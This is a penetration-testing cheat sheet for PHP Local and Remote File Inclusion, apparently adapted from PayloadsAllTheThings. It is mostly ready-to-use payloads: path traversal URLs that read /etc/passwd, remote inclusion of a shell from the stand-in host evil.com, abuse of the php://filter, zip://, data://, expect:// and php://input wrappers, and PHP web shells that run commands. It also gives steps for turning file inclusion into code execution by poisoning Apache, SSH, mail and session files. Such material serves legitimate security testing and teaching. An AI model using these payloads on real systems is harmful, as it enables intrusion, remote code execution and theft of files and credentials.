# Checks
 - Basic LFI
 - Basic RFI
 - LFI / RFI using wrappers
 - LFI to RCE via /proc/*/fd
 - LFI to RCE via /proc/self/environ
 - LFI to RCE via upload
 - LFI to RCE via controlled log file
 - LFI to RCE via PHP sessions
 - LFI to RCE via credentials files

Note : The number of ways to exploit is huge, more details can be found here:
- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion

# Path Transversal Cheat Sheet (List of files)
#### WIndows
- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Directory%20Traversal#interesting-windows-files
- https://gracefulsecurity.com/path-traversal-cheat-sheet-windows/

#### Linux
- https://gracefulsecurity.com/path-traversal-cheat-sheet-linux/
- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Directory%20Traversal#interesting-linux-files

# LFI
### Basic LFI
In the following examples we include the /etc/passwd file, check the Directory & Path Traversal chapter for more interesting files.
```txt
http://example.com/index.php?page=../../../etc/passwd
```
### Null byte
warning In versions of PHP below 5.3.4 we can terminate with null byte.
```txt
http://example.com/index.php?page=../../../etc/passwd%00
```
### Double encoding
```txt
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd%00
```

### Path and dot truncation
On most PHP installations a filename longer than 4096 bytes will be cut off so any excess chars will be thrown away.
```txt
http://example.com/index.php?page=../../../etc/passwd............[ADD MORE]
http://example.com/index.php?page=../../../etc/passwd\.\.\.\.\.\.[ADD MORE]
http://example.com/index.php?page=../../../etc/passwd/./././././.[ADD MORE] 
http://example.com/index.php?page=../../../[ADD MORE]../../../../etc/passwd
```

# RFI
In order for an RFI to be successful, two functions in PHP’s configuration file need to be set. <b>allow_url_fopen</b> and <b>allow_url_include</b> both need to be ‘On’.
### Basic RFI
Most of the filter bypasses from LFI section can be reused for RFI.
```txt
http://example.com/index.php?page=http://evil.com/shell.txt
```

### Null byte
```txt
http://example.com/index.php?page=http://evil.com/shell.txt%00
```
### Double encoding
```txt
http://example.com/index.php?page=http:%252f%252fevil.com%252fshell.txt
```
### Bypass allow_url_include
When <b>allow_url_include</b> and <b>allow_url_fopen</b> are set to Off. It is still possible to include a remote file on Windows box using the smb protocol.
1. Create a share open to everyone
2. Write a PHP code inside a file : shell.php
3. Include it http://example.com/index.php?page=\\10.0.0.1\share\shell.php


# LFI / RFI using wrappers
### Wrapper php://filter
The part "php://filter" is case insensitive
```txt
http://example.com/index.php?page=php://filter/read=string.rot13/resource=index.php
http://example.com/index.php?page=php://filter/convert.iconv.utf-8.utf-16/resource=index.php
http://example.com/index.php?page=php://filter/convert.base64-encode/resource=index.php
http://example.com/index.php?page=pHp://FilTer/convert.base64-encode/resource=index.php
```

### Wrapper zip://
```txt
echo "<pre><?php system($_GET['cmd']); ?></pre>" > payload.php;  
zip payload.zip payload.php;
mv payload.zip shell.jpg;
rm payload.php

http://example.com/index.php?page=zip://shell.jpg%23payload.php
```

### Wrapper data://
```txt
http://example.net/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
NOTE: the payload is "<?php system($_GET['cmd']);echo 'Shell done !'; ?>"
```

### Wrapper expect://
```txt
http://example.com/index.php?page=expect://id
http://example.com/index.php?page=expect://ls
```

### Wrapper input://
Specify your payload in the POST parameters, this can be done with a simple curl command.
```txt
curl -X POST --data "<?php echo shell_exec('id'); ?>" "https://example.com/index.php?page=php://input%00" -k -v
```

### LFI to RCE via /proc/*/fd
1.  Upload a lot of shells (for example : 100)
2.  Include [http://example.com/index.php?page=/proc/$PID/fd/$FD](http://example.com/index.php?page=/proc/$PID/fd/$FD), with $PID = PID of the process (can be bruteforced) and $FD the filedescriptor (can be bruteforced too)

### LFI to RCE via /proc/self/environ
Like a log file, send the payload in the User-Agent, it will be reflected inside the /proc/self/environ file
```txt
GET vulnerable.php?filename=../../../proc/self/environ HTTP/1.1
User-Agent: <?=phpinfo(); ?>
```

### LFI to RCE via upload
If you can upload a file, just inject the shell payload in it (e.g : <?php system($_GET['c']); ?> ).
```txt
http://example.com/index.php?page=path/to/uploaded/file.png
```
In order to keep the file readable it is best to inject into the metadata for the pictures/doc/pdf

### LFI to RCE via controlled log file
Just append your PHP code into the log file by doing a request to the service (Apache, SSH..) and include the log file.
```txt
http://example.com/index.php?page=/var/log/apache/access.log
http://example.com/index.php?page=/var/log/apache/error.log
http://example.com/index.php?page=/var/log/apache2/access.log
http://example.com/index.php?page=/var/log/apache2/error.log
http://example.com/index.php?page=/var/log/nginx/access.log
http://example.com/index.php?page=/var/log/nginx/error.log
http://example.com/index.php?page=/var/log/vsftpd.log
http://example.com/index.php?page=/var/log/sshd.log
http://example.com/index.php?page=/var/log/mail
http://example.com/index.php?page=/var/log/httpd/error_log
http://example.com/index.php?page=/usr/local/apache/log/error_log
http://example.com/index.php?page=/usr/local/apache2/log/error_log
```

### RCE via SSH
Try to ssh into the box with a PHP code as username <?php system($_GET["cmd"]);?>.
```bash
ssh <?php system($_GET["cmd"]);?>@10.10.10.10
```
Then include the SSH log files inside the Web Application.
```txt
http://example.com/index.php?page=/var/log/auth.log&cmd=id
```

### RCE via Mail
First send an email using the open SMTP then include the log file located at http://example.com/index.php?page=/var/log/mail.
```bash
root@kali:~# telnet 10.10.10.10. 25
Trying 10.10.10.10....
Connected to 10.10.10.10..
Escape character is '^]'.
220 straylight ESMTP Postfix (Debian/GNU)
helo ok
250 straylight
mail from: mail@example.com
250 2.1.0 Ok
rcpt to: root
250 2.1.5 Ok
data
354 End data with <CR><LF>.<CR><LF>
subject: <?php echo system($_GET["cmd"]); ?>
data2
.
```

### LFI to RCE via PHP sessions
Check if the website use PHP Session (PHPSESSID)
```php
Set-Cookie: PHPSESSID=i56kgbsq9rm8ndg3qbarhsbm27; path=/
Set-Cookie: user=admin; expires=Mon, 13-Aug-2018 20:21:29 GMT; path=/; httponly
```
In PHP these sessions are stored into /var/lib/php5/sess_[PHPSESSID] or /var/lib/php/session/sess_[PHPSESSID] files
```bash
/var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm27.
user_ip|s:0:"";loggedin|s:0:"";lang|s:9:"en_us.php";win_lin|s:0:"";user|s:6:"admin";pass|s:6:"admin";
```
Set the cookie to <?php system('cat /etc/passwd');?>
```txt
login=1&user=<?php system("cat /etc/passwd");?>&pass=password&lang=en_us.php
```
Use the LFI to include the PHP session file
```txt
login=1&user=admin&pass=password&lang=/../../../../../../../../../var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm27
```
### LFI to RCE via credentials files
This method require high privileges inside the application in order to read the sensitive files.
- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion#lfi-to-rce-via-credentials-files